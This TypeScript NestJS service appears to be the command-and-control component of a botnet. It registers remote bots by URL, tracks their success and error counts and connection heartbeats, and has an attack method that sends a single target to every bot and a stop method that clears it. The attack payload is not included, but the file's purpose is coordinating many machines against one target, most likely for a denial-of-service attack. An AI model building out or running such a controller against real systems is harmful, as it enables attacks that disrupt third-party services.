import { Injectable } from '@nestjs/common';
import { AttackInfo } from './models/attack-info';
import { BotInfo } from './models/bot-info';


interface ControlBotInfo {
    botUrl: string;
    target: AttackInfo | null;
    loop: number;
    success: number;
    error: number;
    status: 'working' | 'idle' | 'offline';
    _intervalHandle: NodeJS.Timeout;
    connected: boolean;
}

@Injectable()
export class ControlService {
    private _bots: ControlBotInfo[] = [];
    
    get bots() { return this._bots.map(x=>this.convertBotInfo(x)); }

    updateBot(botUrl: string, loop: number, success: number, error: number) {
        let bot = this._bots.find(x => x.botUrl === botUrl);
        if(!bot) {
            bot = {
                connected: true,
                status: 'idle',
                botUrl: botUrl,
            } as any;
            this._bots.push(bot);
        }

        bot.loop = loop;
        bot.error = error;
        bot.success = success;
        bot.connected = true;

        if(bot._intervalHandle) {
            clearInterval(bot._intervalHandle);
        }

        bot._intervalHandle = setInterval(() => this.onBotDisconnect(bot), 10000);

        return this.convertBotInfo(bot);
    }

    attack(target: AttackInfo) {
        this._bots.forEach(bot => {
            bot.target = target;
            bot.status = 'working';
        });
    }

    stop() {
        this._bots.forEach(bot => {
            bot.target = null;
            bot.status = 'idle';
        });
    }

    private onBotDisconnect(bot: ControlBotInfo) {
        bot.connected = false;
    }

    private convertBotInfo(info: ControlBotInfo) {
        const result = new BotInfo();

        result.botUrl = info.botUrl;
        result.error = info.error;
        result.success = info.success;
        result.loop = info.loop;
        result.status = info.connected ? info.status : 'offline';
        result.target = info.target;

        return result;
    }
}
